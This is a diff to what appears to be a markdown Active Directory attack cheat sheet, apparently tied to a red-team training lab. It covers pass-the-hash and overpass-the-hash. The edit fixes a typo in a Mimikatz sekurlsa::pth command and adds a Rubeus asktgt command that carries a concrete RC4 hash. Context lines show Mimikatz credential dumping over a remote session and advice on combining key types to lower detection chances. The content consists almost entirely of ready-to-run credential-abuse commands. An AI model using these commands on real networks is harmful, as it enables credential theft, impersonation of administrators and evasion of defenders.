@@ -127,6 +127,8 @@ Invoke-Command -Session $sess -ScriptBlock {function:Invoke-Mimikatz -DumpCreds}
 
 Abusing kerberos functionality we can execute commands as another user by only knowing the NTLM hash.
 
+* Invoke-Mimikatz
+
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /usr:Administrator /domain:corp.local /ntlm:<ntlmhash> /run:powershell.exe"'
 ```
@@ -138,5 +140,11 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /usr:Administrator /domain:corp.local /
 > To reduce the cahnces of detection use `aes256`, `aes128` and `NTLM(RC4)` together.
 
 ```powershell
-Invoke-Mimikatz -Command '"sekurlsa::pth /usr:Administrator /domain:corp.local /aes256:<aes256> /aes128:<aes128> /ntlm:<ntlmhash> /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp.local /aes256:<aes256> /aes128:<aes128> /ntlm:<ntlmhash> /run:powershell.exe"'
+```
+
+* Rubeus
+
+```
+.\Rubeus.exe asktgt /domain:dollarcorp.moneycorp.local /user:srvadmin /rc4:a98e18228819e8eec3dfa33cb68b0728 /ptt
 ```
